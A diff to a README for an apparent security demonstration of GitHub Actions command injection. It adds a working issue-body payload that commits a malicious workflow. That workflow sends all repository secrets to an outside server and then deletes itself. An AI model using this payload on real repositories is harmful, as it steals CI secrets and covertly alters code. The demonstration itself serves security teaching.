@@ -73,28 +73,47 @@ First, we need to set up the server in the first demo.
 The issue title for the demo:
 
 ```bash
-# Send as issue body because issue title is capped with character limit
+# Send as issue body because issue title is capped with the character limit
 " && WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0) && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}' && echo "
-```
-
-```bash
-# Fetching the workflow from our repository
-WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0)
-
-# Committing it to current repository
-curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}'
 ```
 
 This payload consists of the following command:
 
 ```bash
-TODO - update
+# Fetching the workflow from our repository
+WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0)
+
+# Committing it to the current repository
+curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}'
 ```
 
-The content is base64 encoding of the workflow we want to commit:
+In the first command, we fetch our pre-created custom workflow [actions/expose_secrets.yml](actions/expose_secrets.yml)
 
 ```yaml
-TODO - update
+name: Exposing ALL Secrets
+
+on:
+  workflow_run:
+    workflows: ["Vuln"]
+
+env:
+  WORKFLOW_NAME: "innocent_workflow.yml"
+  MAINTAINER_NAME: "Maintainer Name"
+  MAINTAINER_EMAIL: "maintainer@gmail.com"
+  COMMIT_MESSAGE: "innocent commit message"
+  URL: http://lab.cycode.com:64375
+
+jobs:
+  expose_secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          echo "${{ toJSON(secrets) }}" > .secrets
+          curl -X POST --data "@.secrets" $URL
+      - run: |
+          SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -s | jq -r .sha)
+          curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -d '{"message":"$COMMIT_MESSAGE","committer":{"name":"$MAINTAINER_NAME","email":"$MAINTAINER_EMAIL"}, "sha":"'"${SHA}"'"}' 
 ```
 
 So the procedure of the demo is the following:
@@ -103,3 +122,5 @@ So the procedure of the demo is the following:
 - The `Vuln` workflow invokes Github API to commit a new workflow, the `Exposing ALL Secrets` workflow.
 - The `Vuln` workflow ends.
 - Because of `workflow_run:`, the Github Actions service will trigger `Exposing ALL Secrets` when `Vuln` ends.
+- `Exposing ALL Secrets` workflow sends all secrets to a hardcoded server.
+- `Exposing ALL Secrets` workflow deletes itself.
